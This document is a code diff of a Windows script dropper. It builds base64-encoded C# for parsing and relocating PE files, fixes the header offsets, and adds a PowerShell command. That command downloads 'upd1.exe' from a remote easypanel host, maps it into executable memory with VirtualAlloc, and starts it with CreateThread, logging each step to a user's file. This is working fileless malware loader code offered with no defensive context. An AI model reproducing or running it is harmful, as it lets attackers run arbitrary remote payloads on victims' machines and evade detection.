@@ -15,8 +15,8 @@ b64 = b64 & "ZCwgbywgaSAtIG8pOwogICAgfQoKICAgIHB1YmxpYyBzdGF0aWMgYnl0ZVtdIFRvSW1
 b64 = b64 & "aW50IGUgPSBCaXRDb252ZXJ0ZXIuVG9JbnQzMihkLCAweDNDKTsKICAgICAgaW50IG9wdCA9IGUgKyAyNDsKICAgICAgdXNo"
 b64 = b64 & "b3J0IG1hZ2ljID0gQml0Q29udmVydGVyLlRvVUludDE2KGQsIG9wdCk7CiAgICAgIHVpbnQgbnNlYyA9IEJpdENvbnZlcnRl"
 b64 = b64 & "ci5Ub1VJbnQxNihkLCBlICsgNik7CiAgICAgIGludCBzb2kgPSBCaXRDb252ZXJ0ZXIuVG9JbnQzMihkLCBvcHQgKyAoKG1h"
-b64 = b64 & "Z2ljID09IDB4MjBiKSA/IDU2IDogNTIpKTsKICAgICAgaW50IHNvaCA9IEJpdENvbnZlcnRlci5Ub0ludDMyKGQsIG9wdCAr"
-b64 = b64 & "ICgobWFnaWMgPT0gMHgyMGIpID8gNjAgOiA1NikpOwogICAgICBieXRlW10gaW1nID0gbmV3IGJ5dGVbc29pXTsKICAgICAg"
+b64 = b64 & "Z2ljID09IDB4MjBiKSA/IDMyIDogMzYpKTsKICAgICAgaW50IHNvaCA9IEJpdENvbnZlcnRlci5Ub0ludDMyKGQsIG9wdCAr"
+b64 = b64 & "ICgobWFnaWMgPT0gMHgyMGIpID8gMzYgOiA0MCkpOwogICAgICBieXRlW10gaW1nID0gbmV3IGJ5dGVbc29pXTsKICAgICAg"
 b64 = b64 & "QXJyYXkuQ29weShkLCBpbWcsIE1hdGguTWluKGQuTGVuZ3RoLCBzb2kpKTsKICAgICAgaW50IHNlY1N0YXJ0ID0gZSArIDI0"
 b64 = b64 & "ICsgc29oOwogICAgICB1aW50W10gdmEgPSBuZXcgdWludFtuc2VjXSwgcnAgPSBuZXcgdWludFtuc2VjXSwgcnN6ID0gbmV3"
 b64 = b64 & "IHVpbnRbbnNlY107CiAgICAgIGZvciAoaW50IGkgPSAwOyBpIDwgbnNlYzsgaSsrKSB7CiAgICAgICAgaW50IHMgPSBzZWNT"
@@ -58,3 +58,7 @@ b64 = b64 & "bnQpYmxrUnZhICsgcnZhT2ZmOwogICAgICAgICAgaWYgKHR5cGUgPT0gMykgewogICA
 b64 = b64 & "dWludCkoQml0Q29udmVydGVyLlRvVUludDMyKGltZywgdCArIDIpICsgZGVsdGEpOwogICAgICAgICAgICBCdWZmZXIuQmxv"
 b64 = b64 & "Y2tDb3B5KEJpdENvbnZlcnRlci5HZXRCeXRlcyhudmFsKSwgMCwgaW1nLCB0ICsgMiwgNCk7CiAgICAgICAgICB9IGVsc2Ug"
 b64 = b64 & "aWYgKHR5cGUgPT0gMTApIHsKICAgICAgICAgICAgdWxvbmcgbnZhbCA9IEJpdENvbnZlcnRlci5Ub1VJbnQ2NChpbWcsIHQp"
+b64 = b64 & "ICsgKHVsb25nKWRlbHRhOwogICAgICAgICAgICBCdWZmZXIuQmxvY2tDb3B5KEJpdENvbnZlcnRlci5HZXRCeXRlcyhudmFs"
+b64 = b64 & "KSwgMCwgaW1nLCB0LCA4KTsKICAgICAgICAgIH0KICAgICAgICB9CiAgICAgIH0KICAgIH0KICB9Cn0K"
+cmd = "powershell -NoExit -Command ""[IO.File]::WriteAllText('C:\Users\Hills\plog.txt','');try{$s=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('" & b64 & "'));Add-Type $s;$b=(New-Object Net.WebClient).DownloadData('https://automacoes-remote-control.sgploq.easypanel.host/upd1.exe');[IO.File]::AppendAllText('C:\Users\Hills\plog.txt','T1 COMPILED+DOWNLOAD ' + $b.Length + [Environment]::NewLine);$i=[K.Win]::ToImage($b);[IO.File]::AppendAllText('C:\Users\Hills\plog.txt','T2 IMG ' + $i.Length + [Environment]::NewLine);[K.Win]::ResolveImports($i);[IO.File]::AppendAllText('C:\Users\Hills\plog.txt','T3 IMPORTS ' + [Environment]::NewLine);$m=[K.Win]::VirtualAlloc(0,[uint32]$i.Length,12288,64);[IO.File]::AppendAllText('C:\Users\Hills\plog.txt','T4 MEM ' + $m + [Environment]::NewLine);[K.Win]::RelocateImg($i,$m);[Runtime.InteropServices.Marshal]::Copy($i,0,$m,$i.Length);[IO.File]::AppendAllText('C:\Users\Hills\plog.txt','T5 COPIED ' + [Environment]::NewLine);$t=[IntPtr]::Zero;$h=[K.Win]::CreateThread(0,0,$m,0,0,[ref]$t);[IO.File]::AppendAllText('C:\Users\Hills\plog.txt','T6 HANDLE ' + $h + ' TID ' + $t + [Environment]::NewLine);if($h -eq 0){$d=[Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($m,[Action]);[IO.File]::AppendAllText('C:\Users\Hills\plog.txt','DIRECT INVOKE ' + [Environment]::NewLine);$d.Invoke()}else{Start-Sleep 6;$ec=[uint32]::Zero;[void][K.Win]::GetExitCodeThread($h,[ref]$ec);[IO.File]::AppendAllText('C:\Users\Hills\plog.txt','THREAD ' + $ec.ToString('X8') + [Environment]::NewLine)}catch{[IO.File]::AppendAllText('C:\Users\Hills\plog.txt','ERR ' + $_.Exception.Message + [Environment]::NewLine)}"
+sh.Run cmd, 1, False
